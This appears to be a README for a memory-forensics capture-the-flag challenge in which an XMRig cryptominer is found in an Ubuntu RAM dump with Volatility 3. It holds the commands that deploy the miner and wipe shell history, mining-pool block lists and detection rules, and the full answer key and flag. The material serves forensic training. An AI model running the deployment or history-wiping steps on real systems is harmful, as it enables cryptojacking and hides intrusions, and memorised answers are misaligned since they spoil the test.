# CryptoMiner Hunter - Memory Forensics Challenge

[![DFIR][dfir-badge]][dfir-url]
[![Forensics][forensics-badge]][forensics-url]
[![Incident Response][ir-badge]][ir-url]
[![Memory Forensics][memory-badge]][memory-url]
[![Volatility][volatility-badge]][volatility-url]
[![Linux][linux-badge]][linux-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[forensics-badge]: https://img.shields.io/badge/Forensics-Investigation-4ECDC4?style=flat&logo=magnifying-glass&logoColor=white
[forensics-url]: https://www.forensicfocus.com/
[ir-badge]: https://img.shields.io/badge/Incident%20Response-Analysis-95E1D3?style=flat&logo=security&logoColor=white
[ir-url]: https://www.incidentresponse.com/
[memory-badge]: https://img.shields.io/badge/Memory%20Forensics-RAM%20Analysis-9B59B6?style=flat&logo=memory&logoColor=white
[memory-url]: https://www.memoryanalysis.net/
[volatility-badge]: https://img.shields.io/badge/Volatility%203-Memory%20Framework-E74C3C?style=flat&logo=python&logoColor=white
[volatility-url]: https://github.com/volatilityfoundation/volatility3
[linux-badge]: https://img.shields.io/badge/Linux-Ubuntu%2024.04-E95420?style=flat&logo=ubuntu&logoColor=white
[linux-url]: https://ubuntu.com/

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Threat Profile](#threat-profile)
3. [Attack Scenario](#attack-scenario)
4. [Environment Setup](#environment-setup)
5. [Attack Simulation](#attack-simulation)
6. [Memory Acquisition](#memory-acquisition)
7. [Forensic Analysis](#forensic-analysis)
8. [Investigation Questions](#investigation-questions)
9. [Incident Report](#incident-report)
10. [Defense Strategies](#defense-strategies)
11. [Security Hardening](#security-hardening)
12. [Repository](#repository)

---

## Scenario Overview

A Linux server running Ubuntu 24.04 was compromised and used for unauthorized cryptocurrency mining. Security team captured memory during incident response. Your mission is to analyze the memory dump using Volatility 3 to reconstruct the complete attack chain and identify all forensic artifacts.

**Target System:** Ubuntu 24.04 Server  
**Kernel Version:** 6.8.0-71-generic  
**Attack Type:** Cryptojacking via SSH compromise  
**Malware:** XMRig cryptocurrency miner  
**Memory Dump:** 8GB RAM capture using LiME

---

## Threat Profile

### Cryptojacking Operations

Cryptojacking is the unauthorized use of computing resources to mine cryptocurrency. Attackers compromise servers with high CPU capacity to generate revenue through mining pools.

**Attack Characteristics:**

- SSH brute force or credential stuffing
- Deployment of mining software (XMRig, CGMiner)
- Persistence mechanisms (cron jobs, systemd services)
- Resource exhaustion (high CPU usage)
- Covert operation (hidden processes, log deletion)

**Targeted Cryptocurrencies:**

- Monero (XMR) - Privacy-focused, CPU-mineable
- Ethereum Classic (ETC)
- Zcash (ZEC)
- Ravencoin (RVN)

**Financial Impact:**

- Electricity costs: $500-2000/month per server
- Performance degradation: 80-95% CPU utilization
- Infrastructure damage: Overheating, hardware failure
- Cloud computing bills: 300-500% increase

---

## Attack Scenario

### Initial Access

The attacker gains SSH access to an Ubuntu 24.04 server through compromised credentials. The source IP 104.28.216.42 establishes a connection and authenticates successfully.

### Reconnaissance

Upon gaining access, the attacker performs system reconnaissance:

```bash
whoami
uname -a
cat /proc/cpuinfo
free -h
df -h
```

The server has 8GB RAM and 4 CPU cores - ideal for cryptocurrency mining.

### Deployment Phase

The attacker downloads XMRig miner and establishes persistence:

**Steps:**

1. Create directory /opt/miner
2. Download XMRig v6.22.0 static binary
3. Extract and configure mining parameters
4. Create config.json with pool credentials
5. Launch miner with nohup to survive terminal closure

### Mining Configuration

The attacker configures XMRig to connect to pool.hashvault.pro:443 using Monero wallet:

```json
{
    "pools": [{
        "url": "pool.hashvault.pro:443",
        "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
        "pass": "x"
    }]
}
```

### Anti-Forensics

The attacker attempts to cover tracks:

```bash
cat /dev/null > ~/.bash_history
history -c
exit
```

However, the security team captures memory before complete cleanup.

---

## Environment Setup

### System Requirements

- Ubuntu 24.04 Server
- Kernel 6.8.0-71-generic
- 8GB+ RAM
- Root privileges
- Internet connectivity

### Tool Installation

#### Volatility 3 Setup

```bash
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
pip install -e .
```

#### Symbol Table Preparation

```bash
mkdir -p volatility3/symbols/linux/
cp ubuntu-6.8.0-71-generic.json volatility3/symbols/linux/
```

The symbol table enables Volatility to parse kernel data structures specific to Ubuntu 24.04 with kernel 6.8.0-71-generic.

---

## Attack Simulation

### Server Preparation

Clean existing mining artifacts:

```bash
pkill -9 xmrig
rm -rf /opt/miner
rm -rf /tmp/*
rm -f /root/memory*.lime
crontab -r
history -c
cat /dev/null > ~/.bash_history
```

### LiME Installation

LiME (Linux Memory Extractor) is used for memory acquisition:

```bash
apt update
apt install -y build-essential linux-headers-$(uname -r) git
cd /tmp
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make
```

This compiles lime-6.8.0-71-generic.ko kernel module.

### Miner Deployment

Deploy XMRig cryptocurrency miner:

```bash
mkdir -p /opt/miner
cd /opt/miner
wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
tar -xf xmrig-6.22.0-linux-static-x64.tar.gz
mv xmrig-6.22.0/xmrig .
chmod +x xmrig
```

Create mining configuration:

```bash
cat > config.json << 'EOF'
{
    "pools": [{
        "url": "pool.hashvault.pro:443",
        "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
        "pass": "x"
    }]
}
EOF
```

Launch miner:

```bash
nohup ./xmrig --config=config.json > /dev/null 2>&1 &
```

Verify operation:

```bash
ps aux | grep xmrig
top -b -n 1 | grep xmrig
```

Expected CPU usage: 95-100% across all cores.

---

## Memory Acquisition

### LiME Memory Capture

Capture volatile memory while miner is running:

```bash
cd /tmp/LiME/src
sudo insmod lime-$(uname -r).ko "path=/root/memory-lime.lime format=lime"
```

Wait 2-5 minutes for completion.

Verify capture:

```bash
ls -lh /root/memory-lime.lime
```

Expected size: ~8GB (full RAM capture)

### Transfer Files

Download memory dump and symbol table:

```bash
scp root@SERVER_IP:/root/memory-lime.lime .
scp root@SERVER_IP:/tmp/ubuntu-6.8.0-71-generic.json .
```

---

## Forensic Analysis

### Symbol Table Generation

The symbol table maps kernel structures for Volatility analysis.

#### Install Debug Symbols

```bash
echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse" | tee -a /etc/apt/sources.list.d/ddebs.list
echo "deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse" | tee -a /etc/apt/sources.list.d/ddebs.list

apt install ubuntu-dbgsym-keyring
apt update
apt install -y linux-image-$(uname -r)-dbgsym
```

#### Build dwarf2json

```bash
apt install -y golang-go
cd /tmp
git clone https://github.com/volatilityfoundation/dwarf2json
cd dwarf2json
go build
```

#### Generate Symbol Table

```bash
sudo ./dwarf2json linux \
     --elf /usr/lib/debug/boot/vmlinux-$(uname -r) \
     --system-map /boot/System.map-$(uname -r) \
     > /tmp/ubuntu-6.8.0-71-generic.json
```

Verify:

```bash
ls -lh /tmp/ubuntu-6.8.0-71-generic.json
```

Expected size: ~60MB JSON file

### Volatility Analysis

Basic verification:

```bash
python3 vol.py -f memory-lime.lime linux.pslist.PsList | head
```

Expected output: Process list including xmrig

---

## Investigation Questions

### Q1: Process Genealogy

What is the PPID (Parent Process ID) of the malicious cryptocurrency miner?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.pslist.PsList | grep xmrig
```

**Output:**

```
0x9cdb00a58000  29434   28606   xmrig   0   0   0   0   2025-10-11 01:15:14.933669 UTC  Disabled
```

**Answer:** 28606

### Q2: Temporal Analysis

What is the exact UTC timestamp when the malicious process was created?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.pslist.PsList | grep xmrig
```

**Output:**

```
29434   28606   xmrig   2025-10-11 01:15:14.933669 UTC
```

**Answer:** 2025-10-11_01:15:14

### Q3: Network IOC

What is the destination IP address the miner connected to?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.sockstat.Sockstat | grep 29434
```

**Output:**

```
100.0xmrig  29434   15  AF_INET STREAM  TCP  178.18.253.193  33220  46.4.28.18  443  ESTABLISHED
```

**Answer:** 46.4.28.18:443

### Q4: Command Reconstruction

The attacker executed a specific command to run the miner. What is the FULL command line with all arguments?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.psaux.PsAux | grep xmrig
```

**Output:**

```
29434   28606   xmrig   ./xmrig --config=config.json
```

**Answer:** ./xmrig_--config=config.json

### Q5: Environmental Forensics

What was the working directory (PWD) when the miner process was launched?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.envars.Envars --pid 29434 | grep PWD
```

**Output:**

```
29434   28606   xmrig   PWD     /opt/miner
```

**Answer:** /opt/miner

### Q6: Cryptocurrency Intelligence

What cryptocurrency was being mined? Research the pool domain and wallet address format.

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.bash.Bash | grep pool
```

**Output:**

```json
{
    "pools": [{
        "url": "pool.hashvault.pro:443"
    }]
}
```

pool.hashvault.pro is a Monero mining pool. The wallet address format (95 characters starting with 4) confirms Monero.

**Answer:** Monero

### Q7: Wallet Extraction

Extract the attacker's cryptocurrency wallet address from memory.

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.bash.Bash | grep -A5 "pools"
```

**Output:**

```json
{
    "pools": [{
        "url": "pool.hashvault.pro:443",
        "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
        "pass": "x"
    }]
}
```

**Answer:** 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD

### Q8: Pool Infrastructure

What is the FQDN of the mining pool server?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.bash.Bash | grep url
```

**Output:**

```
"url": "pool.hashvault.pro:443"
```

**Answer:** pool.hashvault.pro

### Q9: SSH Forensics

What is the source IP address that established the SSH session used for the attack?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.envars.Envars --pid 29434 | grep SSH_CLIENT
```

**Output:**

```
29434   28606   xmrig   SSH_CLIENT      104.28.216.42 38854 22
```

**Answer:** 104.28.216.42

### Q10: Kernel Module Analysis

A kernel module was loaded during the incident. What is the module name visible in the loaded kernel modules?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.lsmod.Lsmod | head -5
```

**Output:**

```
Offset          Module Name     Code Size       Taints                          Load Arguments
0xffffc0bc7140  lime            0x5000          OOT_MODULE,UNSIGNED_MODULE      path=/root/memory-lime.lime
```

**Answer:** lime

### Q11: Process ID

What is the PID of the malicious miner process?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.pslist.PsList | grep xmrig
```

**Output:**

```
29434   28606   xmrig
```

**Answer:** 29434

### Q12: Process Tree Analysis

What is the complete process execution chain from sshd to the miner?

**Analysis:**

```bash
python3 vol.py -f memory-lime.lime linux.pstree.PsTree | grep -A4 sshd
```

**Output:**

```
* 13939   sshd
** 28556  sshd
*** 28606 bash
**** 29434 xmrig
```

**Answer:** sshd->bash->xmrig

---

## Incident Report

### Executive Summary

An Ubuntu 24.04 server was compromised via SSH from source IP 104.28.216.42. The attacker deployed XMRig cryptocurrency miner in /opt/miner directory, configured to mine Monero to wallet 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD via pool.hashvault.pro:443. The mining process consumed 95-100% CPU resources.

### Attack Timeline

```
2025-10-11 01:14:16 UTC - SSH session established from 104.28.216.42
2025-10-11 01:14:17 UTC - Attacker clears bash history
2025-10-11 01:14:37 UTC - Dependencies installed (build-essential, git)
2025-10-11 01:14:56 UTC - LiME framework cloned
2025-10-11 01:15:14 UTC - XMRig downloaded and configured
2025-10-11 01:15:14 UTC - Mining process launched (PID 29434)
2025-10-11 01:15:45 UTC - Memory capture initiated
```

**Total Dwell Time:** 1 minute 29 seconds

### Impact Assessment

**Severity:** HIGH

**Affected Resources:**

- CPU: 95-100% utilization across 4 cores
- Memory: 8GB consumed by system and mining process
- Network: Sustained connection to 46.4.28.18:443
- Electricity: Estimated $2.40/day excess consumption

**Financial Impact:**

- Electricity costs: $72/month
- Performance degradation: Service unavailable
- Incident response: $5,000
- System rebuild: $1,500

**Total Estimated Cost:** $6,572 + $72/month

### Technical Findings

**Malware Details:**

- Name: XMRig v6.22.0
- Binary: /opt/miner/xmrig
- Config: /opt/miner/config.json
- PID: 29434
- PPID: 28606 (bash)
- Start Time: 2025-10-11 01:15:14 UTC

**Network Indicators:**

- C2 Pool: pool.hashvault.pro (46.4.28.18:443)
- Protocol: Stratum mining protocol over TLS
- Source IP: 104.28.216.42
- SSH Session: Port 22

**Persistence:** None detected (relies on nohup for session persistence)

### Root Cause

**Primary Failure:** Weak SSH credentials enabled unauthorized access

**Contributing Factors:**

1. No SSH key-based authentication enforced
2. No fail2ban or rate limiting on SSH
3. No network egress filtering to mining pools
4. No CPU usage monitoring/alerting
5. No endpoint detection deployed

---

## Defense Strategies

### Immediate Response

#### 1. Containment

Kill malicious processes:

```bash
pkill -9 xmrig
pkill -9 -f "pool.hashvault.pro"
```

Remove mining artifacts:

```bash
rm -rf /opt/miner
rm -f /tmp/xmrig*
find / -name "xmrig" -delete 2>/dev/null
```

Block malicious IPs:

```bash
iptables -A INPUT -s 104.28.216.42 -j DROP
iptables -A OUTPUT -d 46.4.28.18 -j DROP
```

#### 2. Credential Reset

Force password change:

```bash
passwd root
passwd -e username
```

Revoke SSH sessions:

```bash
pkill -9 sshd
systemctl restart sshd
```

#### 3. Network Isolation

Disable internet access temporarily:

```bash
iptables -P OUTPUT DROP
iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
iptables -A OUTPUT -d 172.16.0.0/12 -j ACCEPT
iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT
```

### Short-Term Hardening

#### 1. SSH Security

Disable password authentication:

```bash
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd
```

Deploy fail2ban:

```bash
apt install -y fail2ban
systemctl enable fail2ban

cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled = true
port = 22
maxretry = 3
bantime = 3600
findtime = 600
EOF

systemctl restart fail2ban
```

#### 2. Mining Pool Blocking

Block known mining pools at DNS level:

```bash
cat >> /etc/hosts << 'EOF'
0.0.0.0 pool.hashvault.pro
0.0.0.0 pool.minexmr.com
0.0.0.0 pool.supportxmr.com
0.0.0.0 xmr.nanopool.org
0.0.0.0 pool.minergate.com
EOF
```

Firewall rules:

```bash
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
```

#### 3. Process Monitoring

Deploy process monitoring:

```bash
cat > /usr/local/bin/monitor_mining.sh << 'EOF'
#!/bin/bash
ps aux | grep -E "(xmrig|minerd|cpuminer)" | grep -v grep
if [ $? -eq 0 ]; then
    echo "Mining process detected!" | mail -s "ALERT: Cryptominer" admin@company.com
    pkill -9 xmrig minerd cpuminer
fi
EOF

chmod +x /usr/local/bin/monitor_mining.sh
echo "*/5 * * * * /usr/local/bin/monitor_mining.sh" | crontab -
```

### Long-Term Security

#### 1. Endpoint Detection

Deploy OSSEC or Wazuh:

```bash
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt update
apt install -y wazuh-agent
```

Configure crypto mining detection:

```xml
<rule id="100001" level="12">
  <if_sid>530</if_sid>
  <match>xmrig|minerd|cpuminer</match>
  <description>Cryptocurrency mining software detected</description>
</rule>
```

#### 2. Network Monitoring

Deploy Suricata IDS:

```bash
apt install -y suricata
```

Custom rules:

```
alert tcp $HOME_NET any -> any [3333,5555,7777,9999] (msg:"Cryptocurrency mining pool connection"; flow:established,to_server; classtype:trojan-activity; sid:1000001; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"XMRig User-Agent detected"; content:"XMRig"; http_user_agent; classtype:trojan-activity; sid:1000002; rev:1;)
```

#### 3. Resource Limits

Implement CPU quotas:

```bash
cat > /etc/systemd/system/cpu-limit.slice << 'EOF'
[Slice]
CPUQuota=80%
EOF

systemctl daemon-reload
```

---

## Security Hardening

### SSH Hardening

Complete SSH lockdown:

```bash
cat > /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
MaxAuthTries 3
MaxSessions 2
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers admin@10.0.0.0/8
DenyUsers root
X11Forwarding no
PermitEmptyPasswords no
Protocol 2
EOF

systemctl restart sshd
```

### Kernel Hardening

Sysctl security parameters:

```bash
cat >> /etc/sysctl.conf << 'EOF'
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.yama.ptrace_scope = 1
EOF

sysctl -p
```

### Auditd Configuration

Enable comprehensive logging:

```bash
apt install -y auditd
systemctl enable auditd

cat >> /etc/audit/rules.d/crypto.rules << 'EOF'
-w /opt/ -p wa -k mining_directory
-w /tmp/ -p x -k tmp_execution
-w /usr/bin/wget -p x -k file_download
-w /usr/bin/curl -p x -k file_download
-a always,exit -F arch=b64 -S execve -k process_execution
EOF

service auditd restart
```

### Application Whitelisting

Deploy AppArmor profiles:

```bash
apt install -y apparmor-utils

cat > /etc/apparmor.d/opt.miner << 'EOF'
#include <tunables/global>

/opt/** {
  deny /opt/** rwx,
}
EOF

apparmor_parser -r /etc/apparmor.d/opt.miner
```

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/CryptoMiner%20Hunter](https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/CryptoMiner%20Hunter)

### Repository Structure

```
CryptoMiner Hunter/
├── README.md                       
├── app/                            
│   ├── app.py                     
│   ├── index.html                 
│   ├── template.json              
│   ├── config.cfg                 
│   ├── requirements.txt           
│   └── assets/                    
│       ├── css/
│       ├── js/
│       ├── img/
│       └── sounds/
├── Create/                         
│   ├── Build/
│   │   ├── CryptoMiner.md         
│   │   ├── ubuntu-6.8.0-71-generic.json
│   │   └── volatility3.zip        
│   └── File/
│       ├── ubuntu-6.8.0-71-generic.json
│       └── volatility3.zip
└── Solve/                          
    ├── solution.json              
    ├── steps.md                   
    ├── template.json              
    └── volatility3.zip
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t cryptominer .
docker run -d --name CryptoMiner -p 5003:5003 --restart unless-stopped cryptominer

# Access at: http://localhost:5003/?access=3338ff49-d84a-4684-930b-dbc6c218547d

```



#### Memory Dump Analysis

```bash
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
pip install -e .

mkdir -p volatility3/symbols/linux/
cp ubuntu-6.8.0-71-generic.json volatility3/symbols/linux/

python3 vol.py -f memory-lime.lime linux.pslist.PsList
```

### Challenge Submission

Answers are submitted in JSON format:

```json
{
  "ppid": "28606",
  "timestamp": "2025-10-11_01:15:14",
  "network_connection": "46.4.28.18:443",
  "command_line": "./xmrig_--config=config.json",
  "working_directory": "/opt/miner",
  "cryptocurrency": "Monero",
  "wallet_address": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
  "pool_domain": "pool.hashvault.pro",
  "ssh_source_ip": "104.28.216.42",
  "kernel_module": "lime",
  "process_id": "29434",
  "process_tree": "sshd->bash->xmrig"
}
```

Final flag format:

```
flag{28606_2025-10-11_01:15:14_46.4.28.18:443_./xmrig_--config=config.json_/opt/miner_Monero_48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD_pool.hashvault.pro_104.28.216.42_lime_29434_sshd->bash->xmrig}
```

---

## References

### Memory Forensics

- Volatility 3 Documentation: [https://volatility3.readthedocs.io/](https://volatility3.readthedocs.io/)
- LiME Memory Extractor: [https://github.com/504ensicsLabs/LiME](https://github.com/504ensicsLabs/LiME)
- Linux Memory Forensics: [https://www.sans.org/blog/memory-forensics-linux/](https://www.sans.org/blog/memory-forensics-linux/)

### Cryptocurrency Mining

- XMRig Documentation: [https://xmrig.com/docs](https://xmrig.com/docs)
- Monero Mining: [https://www.getmonero.org/resources/user-guides/mine-to-pool.html](https://www.getmonero.org/resources/user-guides/mine-to-pool.html)
- Cryptojacking Defense: [https://www.crowdstrike.com/cybersecurity-101/cryptojacking/](https://www.crowdstrike.com/cybersecurity-101/cryptojacking/)

### Linux Security

- Ubuntu Security Guide: [https://ubuntu.com/security](https://ubuntu.com/security)
- SSH Hardening: [https://www.ssh.com/academy/ssh/security](https://www.ssh.com/academy/ssh/security)
- AppArmor Documentation: [https://gitlab.com/apparmor/apparmor/-/wikis/home](https://gitlab.com/apparmor/apparmor/-/wikis/home)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: Memory Forensics, Linux Security, Cryptojacking Detection

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Qualification Round.

Educational use only. Do not deploy cryptocurrency miners on systems you do not own.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Qualification  
Category: DFIR  
Difficulty: Hard  
Expected Completion Time: 3-5 hours